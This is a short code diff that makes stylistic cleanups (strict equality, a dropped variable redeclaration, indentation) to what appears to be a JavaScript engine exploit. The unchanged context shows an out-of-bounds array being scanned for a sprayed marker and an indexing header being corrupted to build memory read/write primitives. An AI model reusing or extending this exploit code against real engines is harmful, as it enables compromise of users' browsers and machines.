@@ -155,7 +155,7 @@ class BigInt {
   }
 
   neq (val) {
-    return this.hi() != val.hi() || this.lo() != val.lo()
+    return this.hi() !== val.hi() || this.lo() !== val.lo()
   }
 
   gt (val) {
@@ -398,7 +398,7 @@ for (var i = 0; i < oob_arr.length; i += 2) {
   if (val.eq(prim_marker)) {
     log(`Found marker at oob_arr[${i}] !!`)
 
-    var prim_oob_idx = i - 2
+    prim_oob_idx = i - 2
 
     // corrupt indexing header
     oob_arr[prim_oob_idx] = 0x1337
@@ -417,7 +417,7 @@ for (var i = 0; i < spray.length; i++) {
   }
 }
 
-if (prim_oob_idx == -1 || prim_spray_idx == -1) {
+if (prim_oob_idx === -1 || prim_spray_idx === -1) {
     throw new Error("failed !!")
 }
 
@@ -498,7 +498,7 @@ var prim = {
 
 /*
 var test = {
-	a: 13.37
+  a: 13.37
 }
 
 log(`test: ${test}`)
